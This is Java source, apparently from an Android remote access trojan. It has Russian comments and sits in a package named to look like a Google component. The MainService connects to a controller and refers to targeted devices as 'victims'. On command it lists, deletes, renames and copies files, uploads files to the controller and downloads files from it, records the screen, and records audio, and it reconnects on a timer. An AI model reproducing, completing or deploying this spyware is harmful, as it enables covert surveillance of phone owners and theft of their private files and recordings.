package com.google.android.android;

import android.app.Service;
import android.content.Intent;
import android.icu.util.UniversalTimeScale;
import android.os.Build;
import android.os.IBinder;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UTFDataFormatException;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {
    private static MainService _instance;
    private NettyClient nettyClient;

    private final int INTERVAL_CONNECTION_MILLS = 60 * 1000; //интервал переподключения

    private final String INCORRECT_QUERY = "incorrectQuery";
    private final String OWNER_OFFLINE = "ownerOffilne";
    //для отслеживания состояния
    private final String ERROR = "error";
    private final String SUCCESS = "success";
    private final String PROCESS = "process";

    private final String FILE_ISNT_DIRECTORY = "fileIsntDirectory";
    private final String FILE_IS_DIRECTORY = "fileIsDirectory";

    private RecordManager recordManager;

    public static MainService getInstance() {
        return _instance;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        _instance = this;
        Config.load(getSharedPreferences("Config", MODE_PRIVATE));
        recordManager = new RecordManager();
        //recordManager.startRecord(10*60*1000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        newConnection();
        initConnectionTimerTask();
        return super.onStartCommand(intent, flags, startId);
    }

    private void newConnection() {
        nettyClient = new NettyClient();
        nettyClient.execute();
    }

    private void initConnectionTimerTask() {
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new ConnectionTimerTask(), INTERVAL_CONNECTION_MILLS, INTERVAL_CONNECTION_MILLS);
    }

    private class ConnectionTimerTask extends TimerTask {

        @Override
        public void run() {
            // TODO: 28.07.2017 проблема: если долго бездействовать, то соединение умирает, а мы не можем это отловить, скорее всего нужно слать пинги
            /*JSONObject updateQuery = new JSONObject();
            try {
                updateQuery.put("action", "updateConnection");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            _client.sendMessage(updateQuery.toString()); //возможно, поможет
            if (!_client.isConnected()) {
                _client.dispose();
                _client = new TCPClient();
                _client.execute();
            }*/
        }
    }

    public void receiveMessage(JSONObject message) {
        if (message.containsKey("errorCode")) {
            String code = (String) message.get("errorCode");
            switch (code) {
                case INCORRECT_QUERY:
                    // TODO: 14.07.2017 обработка
                    break;
                case OWNER_OFFLINE:
                    // TODO: 14.07.2017 обработка
                    break;
                case SUCCESS:
                    // TODO: 14.07.2017 обработка
                    break;
                case ERROR:
                    // TODO: 14.07.2017 обработка, возможно, пихать ошибки в логи
                    break;
            }
        }


        String action = (String) message.get("action");
        switch (action) {
            case "auth.victim":
                break;
            case "get.files":
                String path = (String) message.get("path");
                File file = new File(path);
                if (!file.isDirectory()) {
                    nettyClient.sendErrorCode(FILE_ISNT_DIRECTORY, (String) message.get("owner"));
                    return;

                }
                JSONArray files = Utils.getFiles(file);
                nettyClient.sendGetFileList(files, (String) message.get("owner"));
                break;
            case "delete.file":

                path = (String) message.get("path");
                String code = ERROR;
                if (Utils.deleteFile(path))
                    code = SUCCESS;

                nettyClient.sendDeleteFile(code, (String) message.get("owner"));
                break;
            case "rename.file":
                path = (String) message.get("path");
                String newPath = (String) message.get("newPath");
                code = ERROR;
                if (Utils.renameFile(path, newPath))
                    code = SUCCESS;
                nettyClient.sendRenameFile(code, (String) message.get("owner"));
                break;
            case "copy.file":
                path = (String) message.get("path");
                newPath = (String) message.get("newPath");
                code = ERROR;
                if (Utils.copyFile(path, newPath))
                    code = SUCCESS;
                nettyClient.sendCopyFile(code, (String) message.get("owner"));
                break;
            case "make.dir":
                path = (String) message.get("path");
                code = ERROR;
                if (Utils.makeDir(path))
                    code = SUCCESS;
                nettyClient.sendMakeDir(code, (String) message.get("owner"));
                break;
            case "get.file.info":
                path = (String) message.get("path");
                JSONObject info = new JSONObject();
                info.put("fullPath", path);
                info.put("size", Utils.getSize(path));
                info.put("lastModifiedTime", Utils.getLastModified(path));
                nettyClient.sendGetFileInfo(info, (String) message.get("owner"));
                break;
            /*case "getVictimInfo":
                outputJSONObject.put("action", "getVictimInfoList");
                outputJSONObject.put("name", Config.PHONE_NAME);
                outputJSONObject.put("phoneName", Build.MODEL);
                outputJSONObject.put("owner", Config.OWNER_NAME);
                outputJSONObject.put("ip", Config.IP_ADDRESS);
                outputJSONObject.put("serverPort", Config.SERVER_PORT);
                outputJSONObject.put("downloadPort", Config.DOWNLOAD_PORT);

                return outputJSONObject.toString();*/
            case "start.download.file":
                DownloadThread download = new DownloadThread((String) message.get("filename"), ((Long) message.get("port")).intValue(), (String) message.get("downloadPath"));
                download.start();
                break;
            case "start.upload.file":
                UploadThread upload = new UploadThread((String) message.get("path"), ((Long) message.get("port")).intValue());
                upload.start();
                break;
            case "set.victim.name":
                String name = (String) message.get("name");
                code = ERROR;
                if (Config.setName(name))
                    code = SUCCESS;
                nettyClient.sendSetVictimName(code, (String) message.get("owner"));
                break;
            case "start.record.screen":
                try {
                    path = (String) message.get("path");
                    int seconds = ((Long) message.get("seconds")).intValue();
                    MainActivity.getInstance().startRecordScreen(seconds);
                } catch (Exception e) {
                    nettyClient.sendErrorCode(e.getMessage(), "test");
                }
                break;
            case "stop.record.screen":
                MainActivity.getInstance().stopRecordScreen();
                break;
            case "start.audio.record":
                if (recordManager == null) recordManager = new RecordManager();
                int seconds = ((Long) message.get("seconds")).intValue();
                if (seconds == 0) return;
                boolean result = recordManager.startRecord(seconds * 1000);
                code = (result)? SUCCESS : ERROR;
                nettyClient.sendStartAudioRecord(code, (String) message.get("owner"));
                break;
            /*case "setOwner":
                String owner = message.getString("owner");
                outputJSONObject.put("owner", owner);
                if (Config.setOwner(owner))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();*/
            /*case "set.login.ips":
                String ip = message.getString("ip");
                if (Config.setIpAddress(ip))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "setServerPort":
                int serverPort = message.getInt("serverPort");
                if (Config.setServerPort(serverPort))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "setDownloadPort":
                int downloadPort = message.getInt("downloadPort");
                if (Config.setDownloadPort(downloadPort))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "record":
                int secondsTime = message.getInt("time");

                if (_recordManager.startRecord(secondsTime * 1000))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();*/
        }
    }
}
